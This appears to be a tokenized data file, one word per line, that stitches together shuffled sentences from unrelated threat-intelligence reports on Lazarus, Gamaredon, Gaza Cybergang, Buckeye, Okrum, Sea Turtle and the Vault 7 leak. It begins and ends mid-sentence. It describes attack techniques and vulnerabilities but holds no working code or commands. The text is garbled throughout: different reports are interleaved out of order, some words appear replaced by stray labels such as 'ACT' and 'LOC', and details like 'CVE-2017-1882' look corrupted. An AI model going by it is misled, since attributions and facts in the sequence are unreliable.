for
mapping
available
resources
and
lateral
movement
as
well
.
 
To
make
the
fraudulent
withdrawals
,
Lazarus
first
breaches
targeted
banks'
networks
and
compromises
the
switch
application
servers
handling
ATM
transactions
.
 
The
operation
,
known
as
FASTCash
has
enabled
Lazarus
to
fraudulently
empty
ATMs
of
cash
.
 
In
order
to
permit
their
fraudulent
withdrawals
from
ATMs
,
Lazarus
inject
a
malicious
Advanced
Interactive
eXecutive
(AIX)
executable
into
a
running
,
legitimate
process
on
the
switch
application
server
of
a
financial
transaction
network
,
in
this
case
a
network
handling
ATM
transactions
.
 
It
was
previously
believed
that
the
attackers
used
scripts
to
manipulate
legitimate
software
on
the
server
into
enabling
the
fraudulent
activity
.
 
In
recent
years
,
Lazarus
has
also
become
involved
in
financially
motivated
attacks
.
 
This
malware
in
turn
intercepts
fraudulent
Lazarus
cash
withdrawal
requests
and
sends
fake
approval
responses
,
allowing
the
attackers
to
steal
cash
from
ATMs
.
 
Lazarus
was
linked
to
the
$81
million
theft
from
the
Bangladesh
central
bank
in
2016
,
along
with
a
number
of
other
bank
heists
.
 
Lazarus
was
also
linked
to
the
WannaCry
ransomware
outbreak
in
May
2017
.
 
WannaCry
incorporated
the
leaked
EternalBlue
exploit
that
used
two
known
vulnerabilities
in
Windows
CVE-2017-0144
and
CVE-2017-0145
to
turn
the
ransomware
into
a
worm
,
capable
of
spreading
itself
to
any
unpatched
computers
on
the
victim's
network
and
also
to
other
vulnerable
computers
connected
to
the
internet
.
 
Lazarus
was
initially
known
for
its
involvement
in
espionage
operations
and
a
number
of
high-profile
disruptive
attacks
,
including
the
2014
attack
on
Sony
Pictures
that
saw
large
amounts
of
information
being
stolen
and
computers
wiped
by
malware
.
 
In
short
,
Lazarus
continues
to
pose
a
serious
threat
to
the
financial
sector
and
organizations
should
take
all
necessary
steps
to
ensure
that
their
payment
systems
are
fully
up
to
date
and
secured
.
 
As
with
the
2016
series
of
virtual
bank
heists
,
including
the
Bangladesh
Bank
heist
,
FASTCash
illustrates
that
Lazarus
possesses
an
in-depth
knowledge
of
banking
systems
and
transaction
processing
protocols
and
has
the
expertise
to
leverage
that
knowledge
in
order
to
steal
large
sums
from
vulnerable
banks
.
 
The
attack
,
which
starts
with
a
malicious
attachment
disguised
as
a
top
secret
US
document
,
weaponizes
TeamViewer
,
the
popular
remote
access
and
desktop
sharing
software
,
to
gain
full
control
of
the
infected
computer
.
 
As
described
in
the
infection
flow
,
one
of
the
first
uses
of
the
AutoHotKey
scripts
is
to
upload
a
screenshot
from
the
compromised
PC
.
 
It
is
hard
to
tell
if
there
are
geopolitical
motives
behind
this
campaign
by
looking
solely
at
the
list
of
countries
it
was
targeting
,
since
it
was
not
after
a
specific
region
and
the
victims
came
from
different
places
in
the
world
.
 
The
initial
infection
vector
used
by
the
threat
actor
also
changed
over
time
,
during
2018
we
have
seen
multiple
uses
of
self-extracting
archives
instead
of
malicious
documents
with
AutoHotKey
,
which
displayed
a
decoy
image
to
the
user
.
 
The
recent
wave
of
FASTCash
attacks
demonstrates
that
financially
motivated
attacks
are
not
simply
a
passing
interest
for
the
Lazarus
group
and
can
now
be
considered
one
of
its
core
activities
.
 
Although
both
examples
of
the
different
delivery
methods
described
above
show
an
exclusive
targeting
of
Russian
speakers
,
the
recurring
financial
and
political
themes
that
they
use
highlight
the
attacker's
interest
in
the
financial
world
once
more
.
 
Throughout
our
investigation
,
we
have
found
evidence
that
shows
operational
similarities
between
this
implant
and
Gamaredon
Group
.
 
Gamaredon
Group
is
an
alleged
Russian
threat
group
.
 
Gamaredon
Group
has
been
active
since
at
least
2013
,
and
has
targeted
individuals
likely
involved
with
the
Ukrainian
government
.
 
EvilGnome's
functionalities
include
desktop
screenshots
,
file
stealing
,
allowing
capturing
audio
recording
from
the
users
microphone
and
the
ability
to
download
and
execute
further
modules
.
 
Gamaredon
Group
primarily
makes
use
of
Russian
hosting
providers
in
order
to
distribute
its
malware
.
 
Gamaredon
Group's
implants
are
characterized
by
the
employment
of
information
stealing
tools
among
them
being
screenshot
and
document
stealers
delivered
via
a
SFX
,
and
made
to
achieve
persistence
through
a
scheduled
task
.
 
Gamaredon
Group
infects
victims
using
malicious
attachments
,
delivered
via
spear
phishing
techniques
.
 
The
techniques
and
modules
employed
by
EvilGnome
that
is
the
use
of
SFX
,
persistence
with
task
scheduler
and
the
deployment
of
information
stealing
toolsremind
us
of
Gamaredon
Groups
Windows
tools
.
 
We
can
observe
that
the
sample
is
very
recent
,
created
on
Thursday
,
July
4
.
 
As
can
be
observed
in
the
illustration
above
,
the
makeself
script
is
instructed
to
run
./setup.sh
after
unpacking
.
 
The
ShooterAudio
module
uses
PulseAudio
to
capture
audio
from
the
user's
microphone
.
 
makeself.sh
is
a
small
shell
script
that
generates
a
self-extractable
compressed
tar
archive
from
a
directory
.
 
During
our
2018
monitoring
of
this
group
,
we
were
able
to
identify
different
techniques
utilized
by
very
similar
attackers
in
the
MENA
region
,
sometimes
on
the
same
target
.
 
Gaza
Cybergang
Group3
(highest
sophistication)
whose
activities
previously
went
by
the
name
Operation
Parliament
.
 
Gaza
Cybergang
has
been
seen
employing
phishing
,
with
several
chained
stages
to
evade
detection
and
extend
command
and
control
server
lifetimes
.
 
The
most
popular
targets
of
SneakyPastes
are
embassies
,
government
entities
,
education
,
media
outlets
,
journalists
,
activists
,
political
parties
or
personnel
,
healthcare
and
banking
.
 
Through
our
continuous
monitoring
of
threats
during
2018
,
we
observed
a
new
wave
of
attacks
by
Gaza
Cybergang
Group1
targeting
embassies
and
political
personnel
.
 
Gaza
Cybergang
Group1
is
an
attack
group
with
limited
infrastructure
and
an
open-source
type
of
toolset
,
which
conducts
widespread
attacks
,
but
is
nevertheless
focused
on
Palestinian
political
problems
.
 
In
this
campaign
,
Gaza
Cybergang
used
disposable
emails
and
domains
as
the
phishing
platform
to
target
the
victims
.
 
The
RAT
,
however
,
had
a
multitude
of
functionalities
(as
listed
in
the
table
below)
such
as
to
download
and
execute
,
compress
,
encrypt
,
upload
,
search
directories
,
etc
.
 
We
expect
the
damage
caused
by
these
groups
to
intensify
and
the
attacks
to
extend
into
other
regions
that
are
also
linked
to
the
complicated
Palestinian
situation
.
 
Cylance
determined
that
the
Ghost
Dragon
group
utilized
specifically
tailored
variants
of
Gh0st
RAT
,
which
the
group
modified
from
the
3.6
version
of
the
source
code
released
in
2008
.
 
The
standard
network
protocol
for
Gh0st
RAT
3.6
employs
zlib
compression
,
which
utilizes
Gh0st
as
a
static
five-byte
packet
flag
that
must
be
included
in
the
first
five
bytes
of
initial
transmission
from
the
victim
.
 
In
a
more
recent
version
of
the
modified
Gh0st
RAT
malware
,
Ghost
Dragon
implemented
dynamic
packet
flags
which
change
the
first
five
bytes
of
the
header
in
every
login
request
with
the
controller
.
 
SPEAR
has
observed
numerous
different
XOR
keys
utilized
by
Ghost
Dragon
.
 
exploit
and
tools
continued
to
be
used
after
Buckeye's
apparent
disappearance
in
2017
.
 
The
Buckeye
attack
group
was
using
Equation
Group
tools
to
gain
persistent
access
to
target
organizations
at
least
a
year
prior
to
the
Shadow
Brokers
leak
.
 
Buckeye's
use
of
Equation
Group
tools
also
involved
the
exploit
of
a
previously
unknown
Windows
zero-day
vulnerability
.
 
While
Buckeye
appeared
to
cease
operations
in
mid-2017
,
the
Equation
Group
tools
it
used
continued
to
be
used
in
attacks
until
late
2018
.
 
The
2017
leak
of
Equation
Group
tools
by
a
mysterious
group
calling
itself
the
Shadow
Brokers
was
one
of
the
most
significant
cyber
security
stories
in
recent
years.
However
,
Symantec
has
now
found
evidence
that
the
Buckeye
Cyber
Espionage
group
(aka
APT3
,
Gothic
Panda
)
began
using
Equation
Group
tools
in
attacks
at
least
a
year
prior
to
the
Shadow
Brokers
leak
.
 
Equation
is
regarded
as
one
of
the
most
technically
adept
espionage
groups
and
the
release
of
a
trove
of
its
tools
had
a
major
impact
,
with
many
attackers
rushing
to
deploy
the
malware
and
exploits
disclosed
.
 
DoublePulsar
was
delivered
to
victims
using
a
custom
exploit
tool
(Trojan.Bemstour)
that
was
specifically
designed
to
install
DoublePulsar
.
 
One
vulnerability
is
a
Windows
zero-day
vulnerability
(CVE-2019-0703)
discovered
by
Symantec
.
 
Bemstour
exploits
two
Windows
vulnerabilities
in
order
to
achieve
remote
kernel
code
execution
on
targeted
computers
.
 
The
second
Windows
vulnerability
(
CVE-2017-0143
)
was
patched
in
March
2017
after
it
was
discovered
to
have
been
used
by
two
exploit
tools
EternalRomance
and
EternalSynergy
that
were
also
released
as
part
of
the
Shadow
Brokers
leak
.
 
It
was
reported
by
Symantec
to
Microsoft
in
September
2018
and
was
patched
on
March
12
,
2019
.
 
How
Buckeye
obtained
Equation
Group
tools
at
least
a
year
prior
to
the
Shadow
Brokers
leak
remains
unknown
.
 
The
Buckeye
attack
group
had
been
active
since
at
least
2009
,
when
it
began
mounting
a
string
of
espionage
attacks
,
mainly
against
organizations
based
in
the
U.S
.
 
These
include
CVE-2010-3962
as
part
of
an
attack
campaign
in
2010
and
CVE-2014-1776
in
2014
.
 
Beginning
in
August
2016
,
a
group
calling
itself
the
Shadow
Brokers
began
releasing
tools
it
claimed
to
have
originated
from
the
Equation
Group
.
 
Over
the
coming
months
,
it
progressively
released
more
tools
,
until
April
2017
,
when
it
released
a
final
,
large
cache
of
tools
,
including
the
DoublePulsar
backdoor
,
the
FuzzBunch
framework
,
and
the
EternalBlue
,
EternalSynergy
,
and
EternalRomance
exploit
tools
.
 
However
,
Buckeye
had
already
been
using
some
of
these
leaked
tools
at
least
a
year
beforehand
.
 
The
earliest
known
use
of
Equation
Group
tools
by
Buckeye
is
March
31
,
2016
,
during
an
attack
on
a
target
in
Hong
Kong
.
 
Beginning
in
March
2016
,
Buckeye
began
using
a
variant
of
DoublePulsar
(Backdoor.Doublepulsar)
,
a
backdoor
that
was
subsequently
released
by
the
Shadow
Brokers
in
2017
.
 
However
,
while
activity
involving
known
Buckeye
tools
ceased
in
mid-2017
,
the
Bemstour
exploit
tool
and
the
DoublePulsar
variant
used
by
Buckeye
continued
to
be
used
until
at
least
September
2018
in
conjunction
with
different
malware
.
 
During
this
attack
,
the
Bemstour
exploit
tool
was
delivered
to
victims
via
known
Buckeye
malware
(Backdoor.Pirpi)
.
 
One
hour
later
,
Bemstour
was
used
against
an
educational
institution
in
Belgium
.
 
Bemstour
is
specifically
designed
to
deliver
a
variant
of
the
DoublePulsar
backdoor
.
 
DoublePulsar
is
then
used
to
inject
a
secondary
payload
,
which
runs
in
memory
only
.
 
A
significantly
improved
variant
of
the
Bemstour
exploit
tool
was
rolled
out
in
September
2016
,
when
it
was
used
in
an
attack
against
an
educational
institution
in
Hong
Kong
.
 
When
used
against
32-bit
targets
,
Bemstour
still
delivered
the
same
DoublePulsar
backdoor
.
 
Bemstour
was
used
again
in
June
2017
in
an
attack
against
an
organization
in
Luxembourg
.
 
Between
June
and
September
2017
,
Bemstour
was
also
used
against
targets
in
the
Philippines
and
Vietnam
.
 
Development
of
Bemstour
has
continued
into
2019
.
 
Unlike
earlier
attacks
when
Bemstour
was
delivered
using
Buckeye's
Pirpi
backdoor
,
in
this
attack
Bemstour
was
delivered
to
the
victim
by
a
different
backdoor
Trojan
(Backdoor.Filensfer)
.
 
The
most
recent
sample
of
Bemstour
seen
by
Symantec
appears
to
have
been
compiled
on
March
23
,
2019
,
eleven
days
after
the
zero-day
vulnerability
was
patched
by
Microsoft
.
 
Filensfer
is
a
family
of
malware
that
has
been
used
in
targeted
attacks
since
at
least
2013
.
 
The
zero-day
vulnerability
found
and
reported
by
Symantec
(CVE-2019-0703)
occurs
due
to
the
ACT
the
Windows
SMB
Server
handles
certain
requests
.
 
While
Symantec
has
never
observed
the
use
of
Filensfer
alongside
any
known
Buckeye
tools
,
information
shared
privately
by
another
vendor
included
evidence
of
Filensfer
being
used
in
conjunction
with
known
Buckeye
malware
(Backdoor.Pirpi)
.
 
CVE-2017-0143
was
also
used
by
two
other
exploit
toolsEternalRomance
and
EternalSynergythat
were
released
as
part
of
the
Shadow
Brokers
leak
in
April
2017
.
 
Buckeye's
exploit
tool
,
EternalRomance
,
as
well
as
EternalSynergy
,
can
exploit
the
CVE-2017-0143
message
type
confusion
vulnerability
to
perform
memory
corruption
on
unpatched
victim
computers
.
 
In
the
case
of
the
Buckeye
exploit
tool
,
the
attackers
exploited
their
own
zero-day
vulnerability
(CVE-2019-0703)
.
 
It
is
noteworthy
that
the
attackers
never
used
the
FuzzBunch
framework
in
its
attacks
.
 
FuzzBunch
is
a
framework
designed
to
manage
DoublePulsar
and
other
Equation
Group
tools
and
was
leaked
by
the
Shadow
Brokers
in
2017
.
 
There
are
multiple
possibilities
as
to
how
Buckeye
obtained
Equation
Group
tools
before
the
Shadow
Brokers
leak
.
 
However
,
aside
from
the
continued
use
of
the
tools
,
Symantec
has
found
no
other
evidence
suggesting
Buckeye
has
retooled
.
 
this
RTF
exploits
again
the
CVE-2017-1882
on
eqnedt32.exe
.
 
And
the
dropper
execute
the
iassvcs.exe
to
make
a
side
loading
and
make
the
persistence
.
 
This
IP
is
very
interesting
because
it
connects
with
tele.zyns.com
and
old
infrastructures
used
by
chinese
APT
or
DDOS
Chinese
team
against
the
ancient
soviet
republics
.
 
Over
the
past
three
years
,
Filensfer
has
been
deployed
against
organizations
in
Luxembourg
,
Sweden
,
Italy
,
the
UK
,
and
the
U.S
.
 
All
zero-day
exploits
known
,
or
suspected
,
to
have
been
used
by
this
group
are
for
vulnerabilities
in
Internet
Explorer
and
Flash
.
 
According
to
reports
,
the
Philippines
is
the
most
exposed
country
in
ASEAN
to
the
cyberattacks
known
as
advanced
persistent
threats
,
or
APTs
.
 
Our
analysis
of
this
malware
shows
that
it
belongs
to
Hussarini
,
also
known
as
Sarhust
,
a
backdoor
family
that
has
been
used
actively
in
APT
attacks
targeting
countries
in
the
ASEAN
region
since
2014
.
 
OutExtra.exe
is
a
signed
legitimate
application
from
Microsoft
named
finder.exe
.
 
In
addition
to
file-based
protection
,
customers
of
the
DeepSight
Intelligence
Managed
Adversary
and
Threat
Intelligence
(MATI)
service
have
received
reports
on
Buckeye
,
which
detail
methods
of
detecting
and
thwarting
activities
of
this
group
.
 
However
,
in
this
attack
,
this
file
is
used
to
load
the
Hussarini
backdoor
via
DLL
hijacking
.
 
Today
,
this
malware
is
still
actively
being
used
against
the
Philippines
.
 
Hussarini
was
first
mentioned
in
APT
campaigns
targeting
the
Philippines
and
Thailand
in
2014
.
 
Further
analysis
showed
that
the
Iron
cybercrime
group
used
two
main
functions
from
HackingTeam's
source
in
both
IronStealer
and
Iron
ransomware
.
 
Xagent
is
the
original
filename
Xagent.exe
whereas
seems
to
be
the
version
of
the
worm
.
 
Xagent
A
variant
of
JbossMiner
Mining
Worm
a
worm
written
in
Python
and
compiled
using
PyInstaller
for
both
Windows
and
Linux
platforms
.
 
Its
activities
were
traced
back
to
2010
in
FireEye's
2013
report
on
operation
Ke3chang
a
cyberespionage
campaign
directed
at
diplomatic
organizations
in
Europe
.
 
We
have
been
tracking
the
malicious
activities
related
to
this
threat
actor
and
discovered
a
previously
undocumented
malware
family
with
strong
links
to
the
Ke3chang
group
a
backdoor
we
named
Okrum
.
 
Furthermore
,
from
2015
to
2019
,
we
detected
new
versions
of
known
malware
families
attributed
to
the
Ke3chang
group
BS2005
backdoors
from
operation
Ke3chang
and
the
RoyalDNS
malware
,
reported
by
NCC
Group
in
2018
.
 
Ke3chang
behind
the
attacks
seemed
to
have
a
particular
interest
in
Slovakia
,
where
a
big
portion
of
the
discovered
malware
samples
was
detected;
Croatia
,
the
Czech
Republic
and
other
countries
were
also
affected
.
 
Our
technical
analysis
of
the
malware
used
in
these
attacks
showed
close
ties
to
BS2005
backdoors
from
operation
Ke3chang
,
and
to
a
related
TidePool
malware
family
discovered
by
Palo
Alto
Networks
in
2016
that
targeted
Indian
embassies
across
the
globe
.
 
The
story
continued
in
late
2016
,
when
we
discovered
a
new
,
previously
unknown
backdoor
that
we
named
Okrum
.
 
The
malicious
actors
behind
the
Okrum
malware
were
focused
on
the
same
targets
in
Slovakia
that
were
previously
targeted
by
Ketrican
2015
backdoors
.
 
We
started
connecting
the
dots
when
we
discovered
that
the
Okrum
backdoor
was
used
to
drop
a
Ketrican
backdoor
,
freshly
compiled
in
2017
.
 
In
2017
,
the
same
entities
that
were
affected
by
the
Okrum
malware
and
by
the
2015
Ketrican
backdoors
again
became
targets
of
the
malicious
actors
.
 
This
time
,
the
attackers
used
new
versions
of
the
RoyalDNS
malware
and
a
Ketrican
2017
backdoor
.
 
According
to
ESET
telemetry
,
Okrum
was
first
detected
in
December
2016
,
and
targeted
diplomatic
missions
in
Slovakia
,
Belgium
,
Chile
,
Guatemala
and
Brazil
throughout
2017
.
 
In
addition
to
file-based
protection
,
customers
of
the
DeepSight
has
received
reports
on
Buckeye
,
which
detail
methods
of
detecting
and
thwarting
activities
of
this
group
.
 
In
2018
,
we
discovered
a
new
version
of
the
Ketrican
backdoor
that
featured
some
code
improvements
.
 
According
to
our
telemetry
,
Okrum
was
used
to
target
diplomatic
missions
in
Slovakia
,
Belgium
,
Chile
,
Guatemala
,
and
Brazil
,
with
the
attackers
showing
a
particular
interest
in
Slovakia
.
 
Indeed
,
we
have
detected
various
external
tools
being
abused
by
Okrum
,
such
as
a
keylogger
,
tools
for
dumping
passwords
,
or
enumerating
network
sessions
.
 
The
detection
evasion
techniques
we
observed
in
the
Okrum
malware
include
embedding
the
malicious
payload
within
a
legitimate
PNG
image
,
employing
several
anti-emulation
and
anti-sandbox
tricks
,
as
well
as
making
frequent
changes
in
implementation
.
 
The
unnamed
company
makes
products
used
in
the
military
and
aerospace
industries
,
and
the
hackers
could
have
been
after
commercial
secrets
or
more
traditional
espionage
,
according
to
ClearSky
,
the
cybersecurity
firm
that
exposed
the
operation
.
 
North
Korean
dictator
Kim
Jong
Un
has
set
ambitious
economic
goals
,
and
some
cybersecurity
analysts
have
predicted
he
will
unleash
the
Pyongyang-affiliated
hackers
to
meet
those
deadlines
by
targeting
multinational
companies
trade
secrets
.
 
According
to
ClearSky
,
the
suspected
Lazarus
operatives
looked
to
leverage
a
vulnerability
in
outdated
WinRAR
file-archiving
software
that
hackers
have
been
exploiting
since
it
was
disclosed
last
month
.
 
This
new
Lotus
Blossom
campaign
delivers
a
malicious
RTF
document
posing
as
an
ASEAN
Defence
Minister's
Meeting
(ADMM)
directory
(decoy)
that
also
carries
an
executable
(payload)
embedded
as
an
OLE
object
,
the
Elise
backdoor
.
 
Just
months
after
the
APT32
watering
hole
activity
against
ASEAN-related
websites
was
observed
in
Fall
2017
,
this
new
activity
clearly
indicates
the
association
(ASEAN)
clearly
remains
a
priority
collection
target
in
the
region
.
 
Researchers
implicated
Lazarus
Group
because
of
digital
clues
including
a
malicious
implant
known
as
Rising
Sun
that
has
been
attributed
to
the
group
.
 
The
attackers
originally
embedded
an
implant
into
the
malicious
document
as
a
hypertext
application
(HTA)
file
,
and
then
quickly
moved
to
hide
it
in
an
image
on
a
remote
server
and
used
obfuscated
Visual
Basic
macros
to
launch
the
decoder
script
.
 
Lazarus
used
the
open-source
tool
Invoke-PSImage
,
released
December
20
,
to
embed
the
PowerShell
script
into
the
image
file
.
 
Once
the
script
runs
,
it
passes
the
decoded
script
from
the
image
file
to
the
Windows
command
line
in
a
variable
$x
,
which
uses
cmd.exe
to
execute
the
obfuscated
script
and
run
it
via
PowerShell
.
 
The
Department
of
Homeland
Security
(DHS)
issued
an
alert
about
this
activity
on
Jan.
24
2019
,
warning
that
an
attacker
could
redirect
user
traffic
and
obtain
valid
encryption
certificates
for
an
organization's
domain
names
.
 
In
the
Sea
Turtle
campaign
,
Talos
was
able
to
identify
two
distinct
groups
of
victims
.
 
The
first
group
,
we
identify
as
primary
victims
,
includes
national
security
organizations
,
ministries
of
foreign
affairs
,
and
prominent
energy
organizations
.
 
The
threat
actors
behind
the
Sea
Turtle
campaign
show
clear
signs
of
being
highly
capable
and
brazen
in
their
endeavors
.
 
In
most
cases
,
threat
actors
typically
stop
or
slow
down
their
activities
once
their
campaigns
are
publicly
revealed
.
 
The
threat
actors
behind
the
Sea
Turtle
campaign
were
successful
in
compromising
entities
by
manipulating
and
falsifying
DNS
records
at
various
levels
in
the
domain
name
space
.
 
If
an
attacker
was
able
to
compromise
an
organization's
network
administrator
credentials
,
the
attacker
would
be
able
to
change
that
particular
organization's
DNS
records
at
will
.
 
If
the
attackers
were
able
to
obtain
one
of
these
EPP
keys
,
they
would
be
able
to
modify
any
DNS
records
that
were
managed
by
that
particular
registrar
.
 
Captured
legitimate
user
credentials
when
users
interacted
with
these
actor
-
controlled
servers
.
 
The
diagram
below
illustrates
how
we
believe
the
actors
behind
the
Sea
Turtle
campaign
used
DNS
hijacking
to
achieve
their
end
goals
.
 
As
of
early
2019
,
the
only
evidence
of
the
spear-phishing
threat
vector
came
from
a
compromised
organization's
public
disclosure
.
 
On
January
4
,
Packet
Clearing
House
,
which
is
not
an
Internet
exchange
point
but
rather
is
an
NGO
which
provides
support
to
Internet
exchange
points
and
the
core
of
the
domain
name
system
,
provided
confirmation
of
this
aspect
of
the
actors
tactics
when
it
publicly
revealed
its
internal
DNS
had
been
briefly
hijacked
as
a
consequence
of
the
compromise
at
its
domain
registrar
.
 
During
a
typical
incident
,
the
actor
would
modify
the
NS
records
for
the
targeted
organization
,
pointing
users
to
a
malicious
DNS
server
that
provided
actor-controlled
responses
to
all
DNS
queries
.
 
The
next
step
for
the
actor
was
to
build
MitM
servers
that
impersonated
legitimate
services
to
capture
user
credentials
.
 
In
addition
to
the
MitM
server
IP
addresses
published
in
previous
reports
,
Talos
identified
16
additional
servers
leveraged
by
the
actor
during
the
observed
attacks
.
 
The
attackers
would
then
use
the
certificate
on
actor-controlled
servers
to
perform
additional
MitM
operations
to
harvest
additional
credentials
.
 
In
some
cases
,
the
victims
were
redirected
to
these
actor-controlled
servers
displaying
the
stolen
certificate
.
 
One
notable
aspect
of
the
campaign
was
the
actors'
ability
to
impersonate
VPN
applications
,
such
as
Cisco
Adaptive
Security
Appliance
(ASA)
products
,
to
perform
MitM
attacks
.
 
At
this
time
,
we
do
not
believe
that
the
attackers
found
a
new
ASA
exploit
.
 
Rather
,
they
likely
abused
the
trust
relationship
associated
with
the
ASA's
SSL
certificate
to
harvest
VPN
credentials
to
gain
remote
access
to
the
victim's
network
.
 
As
an
example
,
DNS
records
indicate
that
a
targeted
domain
resolved
to
an
actor-controlled
MitM
server
.
 
In
another
case
,
the
attackers
were
able
to
compromise
NetNod
,
a
non-profit
,
independent
internet
infrastructure
organization
based
in
Sweden
.
 
Using
this
access
,
the
threat
actors
were
able
to
manipulate
the
DNS
records
for
sa1[.]dnsnode[.]net
.
 
This
redirection
allowed
the
attackers
to
harvest
credentials
of
administrators
who
manage
domains
with
the
TLD
of
Saudi
Arabia
(.sa)
.
 
In
one
of
the
more
recent
campaigns
on
March
27
,
2019
,
the
threat
actors
targeted
the
Sweden-based
consulting
firm
Cafax
.
 
We
assess
with
high
confidence
that
Sea
Turtle
was
targeted
in
an
attempt
to
re-establish
access
to
the
NetNod
network
,
which
was
previously
compromised
by
this
threat
actor
.
 
Obtaining
access
to
this
ccTLD
registrars
would
have
allowed
attackers
to
hijack
any
domain
that
used
those
ccTLDs
.
 
These
actors
perform
DNS
hijacking
through
the
use
of
actor-controlled
name
servers
.
 
Sea
Turtle
have
been
more
aggressive
in
their
pursuit
targeting
DNS
registries
and
a
number
of
registrars
,
including
those
that
manage
ccTLDs
.
 
These
actors
use
Let's
Encrypts
,
Comodo
,
Sectigo
,
and
self-signed
certificates
in
their
MitM
servers
to
gain
the
initial
round
of
credentials
.
 
These
actors
have
been
more
aggressive
in
their
pursuit
targeting
DNS
registries
and
a
number
of
registrars
,
including
those
that
manage
ccTLDs
.
 
Once
they
have
access
to
the
network
,
they
steal
the
organization's
legitimate
SSL
certificate
and
use
it
on
actor-controlled
servers
.
 
we
believe
that
the
Sea
Turtle
campaign
continues
to
be
highly
successful
for
several
reasons
.
 
Had
more
ccTLDs
implemented
security
features
such
as
registrar
locks
,
attackers
would
be
unable
to
redirect
the
targeted
domains
.
 
The
attackers
stole
organizations'
SSL
certificates
associated
with
security
appliances
such
as
ASA
to
obtain
VPN
credentials
,
allowing
the
actors
to
gain
access
to
the
targeted
network
.
 
The
threat
actors
were
able
to
maintain
long
term
persistent
access
to
many
of
these
networks
by
utilizing
compromised
credentials
.
 
Cisco
Talos
will
continue
to
monitor
Sea
Turtle
and
work
with
our
partners
to
understand
the
threat
as
it
continues
to
evolve
to
ensure
that
our
customers
remain
protected
and
the
public
is
informed
.
 
If
the
user
enables
macro
to
open
the
xlsm
file
,
it
will
then
drop
the
legitimate
script
engine
AutoHotkey
along
with
a
malicious
script
file
.
 
Create
a
link
file
in
the
startup
folder
for
AutoHotkeyU32.exe
,
allowing
the
attack
to
persist
even
after
a
system
restart
.
 
More
importantly
,
one
of
these
files
also
enables
the
download
of
TeamViewer
,
a
remote
access
tool
that
gives
threat
actors
remote
control
over
the
system
.
 
Such
attacks
highlight
the
need
for
caution
before
downloading
files
from
unknown
sources
and
enabling
macro
for
files
from
unknown
sources
.
 
The
agency's
hacking
division
freed
it
from
having
to
disclose
its
often
controversial
operations
to
the
NSA
(its
primary
bureaucratic
rival)
in
order
to
draw
on
the
NSA's
hacking
capacities
.
 
By
the
end
of
2016
,
the
CIA's
hacking
division
,
which
formally
falls
under
the
agency's
Center
for
Cyber
Intelligence
(CCI)
,
had
over
5000
registered
users
and
had
produced
more
than
a
thousand
hacking
systems
,
trojans
,
viruses
,
and
other
weaponized
malware
.
 
Such
is
the
scale
of
the
CIA's
undertaking
that
by
2016
,
its
hackers
had
utilized
more
code
than
that
used
to
run
Facebook
.
 
Wikileaks
has
carefully
reviewed
the
Year
Zero
disclosure
and
published
substantive
CIA
documentation
while
avoiding
the
distribution
of
'armed'
cyberweapons
until
a
consensus
emerges
on
the
technical
and
political
nature
of
the
CIA's
program
and
how
such
'weapons'
should
analyzed
,
disarmed
and
published
.
 
These
redactions
include
ten
of
thousands
of
CIA
targets
and
attack
machines
throughout
Latin
America
,
Europe
and
the
United
States
.
 
The
increasing
sophistication
of
surveillance
techniques
has
drawn
comparisons
with
George
Orwell's
1984
,
but
Weeping
Angel
,
developed
by
the
CIA's
Embedded
Devices
Branch
(EDB)
,
which
infests
smart
TVs
,
transforming
them
into
covert
microphones
,
is
surely
its
most
emblematic
realization
.
 
After
infestation
,
Weeping
Angel
places
the
target
TV
in
a
'Fake-Off'
mode
,
so
that
the
owner
falsely
believes
the
TV
is
off
when
it
is
on
.
 
As
of
October
2014
the
CIA
was
also
looking
at
infecting
the
vehicle
control
systems
used
by
modern
cars
and
trucks
.
 
The
CIA's
Mobile
Devices
Branch
(MDB)
developed
numerous
attacks
to
remotely
hack
and
control
popular
smart
phones
.
 
Despite
iPhone's
minority
share
(14.5%)
of
the
global
smart
phone
market
in
2016
,
a
specialized
unit
in
the
CIA's
Mobile
Development
Branch
produces
malware
to
infest
,
control
and
exfiltrate
data
from
iPhones
and
other
Apple
products
running
iOS
,
such
as
iPads
.
 
The
attack
against
Samsung
smart
TVs
was
developed
in
cooperation
with
the
United
Kingdom's
MI5/BTSS
.
 
CIA's
arsenal
includes
numerous
local
and
remote
zero
days
developed
by
CIA
or
obtained
from
GCHQ
,
NSA
,
FBI
or
purchased
from
cyber
arms
contractors
such
as
Baitshop
.
 
These
techniques
permit
the
CIA
to
bypass
the
encryption
of
WhatsApp
,
Signal
,
Telegram
,
Wiebo
,
Confide
and
Cloackman
by
hacking
the
smart
phones
that
they
run
on
and
collecting
audio
and
message
traffic
before
encryption
is
applied
.
 
The
CIA
also
runs
a
very
substantial
effort
to
infect
and
control
Microsoft
Windows
users
with
its
malware
.
 
CIA's
malware
includes
multiple
local
and
remote
weaponized
zero
days
,
air
gap
jumping
viruses
such
as
Hammer
Drill
which
infects
software
distributed
on
CD/DVDs
,
infectors
for
removable
media
such
as
USBs
,
systems
to
hide
data
in
images
or
in
covert
disk
LOCs
Brutal
Kangaroo
and
to
keep
its
malware
infestations
going
.
 
Many
of
these
infection
efforts
are
pulled
together
by
the
CIA's
Automated
Implant
Branch
(AIB)
,
which
has
developed
several
attack
systems
for
automated
infestation
and
control
of
CIA
malware
,
such
as
Assassin
and
Medusa
.
 
The
CIA
has
developed
automated
multi-platform
malware
attack
and
control
systems
covering
Windows
,
Mac
OS
X
,
Solaris
,
Linux
and
more
,
such
as
EDB's
HIVE
and
the
related
Cutthroat
and
Swindle
tools
,
which
are
described
in
the
examples
section
below
.
 
By
hiding
these
security
flaws
from
manufacturers
like
Apple
and
Google
the
CIA
ensures
that
it
can
hack
everyone
&mdsh;
at
the
expense
of
leaving
everyone
hackable
.
 
Once
in
Frankfurt
CIA
hackers
can
travel
without
further
border
checks
to
the
25
European
countries
that
are
part
of
the
Shengen
open
border
LOC
including
France
,
Italy
and
Switzerland
.
 
A
number
of
the
CIA's
electronic
attack
methods
are
designed
for
physical
proximity
.
 
The
attacker
is
provided
with
a
USB
containing
malware
developed
for
the
CIA
for
this
purpose
,
which
is
inserted
into
the
targeted
computer
.
 
The
attacker
then
infects
and
exfiltrates
data
to
removable
media
.
 
As
an
example
,
specific
CIA
malware
revealed
in
Year
Zero
is
able
to
penetrate
,
infest
and
control
both
the
Android
phone
and
iPhone
software
that
runs
or
has
run
presidential
Twitter
accounts
.
 
For
example
,
the
CIA
attack
system
Fine
Dining
,
provides
24
decoy
applications
for
CIA
spies
to
use
.
 
For
example
,
Comodo
was
defeated
by
CIA
malware
placing
itself
in
the
Window's
Recycle
Bin
.
 
CIA
hackers
discussed
what
the
NSA's
Equation
